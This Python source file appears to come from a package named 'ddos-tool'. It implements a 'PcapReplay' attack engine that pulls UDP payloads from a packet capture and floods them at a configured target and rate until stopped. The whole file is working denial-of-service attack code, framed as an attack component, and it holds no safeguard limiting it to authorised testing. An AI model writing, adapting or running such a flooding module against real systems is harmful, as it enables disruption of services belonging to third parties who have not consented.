from __future__ import annotations

import asyncio
import socket
from pathlib import Path

from ..config import Config
from .base import AttackEngine


class PcapReplay(AttackEngine):
    """Replay UDP payloads from a pcap to the configured destination.

    Destination is always rewritten; source addresses and link-layer headers are
    intentionally discarded. Requires the optional ``replay`` dependency.
    """

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg.effective_rps(), cfg.workers, cfg.duration_sec)
        if cfg.replay is None:
            raise ValueError("replay attack requires replay.file")
        self.file = Path(cfg.replay.file)
        self.rate_factor = cfg.replay.rate_factor
        host, _, port_s = cfg.target.rpartition(":")
        self.host, self.port = host, int(port_s or 9999)

    def _payloads(self) -> list[bytes]:
        try:
            import dpkt
        except ImportError as exc:  # pragma: no cover
            raise RuntimeError("pcap replay needs: pip install 'ddos-tool[replay]'") from exc
        payloads: list[bytes] = []
        with self.file.open("rb") as stream:
            reader = dpkt.pcap.Reader(stream)
            for _, frame in reader:
                try:
                    eth = dpkt.ethernet.Ethernet(frame)
                    ip = eth.data
                    if isinstance(ip, (dpkt.ip.IP, dpkt.ip6.IP6)) and isinstance(ip.data, dpkt.udp.UDP):
                        if ip.data.data:
                            payloads.append(bytes(ip.data.data))
                except (dpkt.dpkt.UnpackError, ValueError):
                    continue
        if not payloads:
            raise ValueError("pcap contains no UDP payloads")
        return payloads

    async def run(self) -> None:
        payloads = self._payloads()
        loop = asyncio.get_running_loop()
        transport, _ = await loop.create_datagram_endpoint(
            asyncio.DatagramProtocol, remote_addr=(self.host, self.port)
        )
        try:
            interval = 1.0 / max(self.bucket.rate * self.rate_factor, 1e-9)
            index = 0
            while not self.stop_event.is_set():
                await self.bucket.acquire()
                transport.sendto(payloads[index % len(payloads)])
                index += 1
                self.stats["sent"] += 1
                self.stats["ok"] += 1
                await asyncio.sleep(interval)
        finally:
            transport.close()
